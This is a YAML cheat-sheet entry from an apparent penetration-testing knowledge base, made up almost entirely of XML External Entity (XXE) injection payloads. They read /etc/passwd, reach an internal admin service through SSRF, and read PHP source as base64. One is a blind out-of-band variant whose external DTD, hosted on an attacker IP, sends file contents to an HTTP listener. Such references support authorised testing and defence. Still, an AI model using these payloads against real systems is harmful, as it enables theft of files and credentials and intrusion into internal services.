---
description: |
  XML External Entity (XXE) injection to read local files, perform SSRF, or exfiltrate data via out-of-band channels.
command: |
  # Basic XXE — read /etc/passwd
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>&xxe;</root>

  # XXE to SSRF — access internal services
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
  ]>
  <root>&xxe;</root>

  # Blind XXE with external DTD — exfiltrate data out-of-band
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://10.10.10.21/evil.dtd">
    %xxe;
  ]>
  <root>&send;</root>

  # evil.dtd hosted on attacker (10.10.10.21)
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY send SYSTEM 'http://10.10.10.21:8000/?data=%file;'>">
  %eval;

  # PHP wrapper in XXE — read source code as base64
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
  ]>
  <root>&xxe;</root>
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - XXE
references:
  - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
  - https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
---
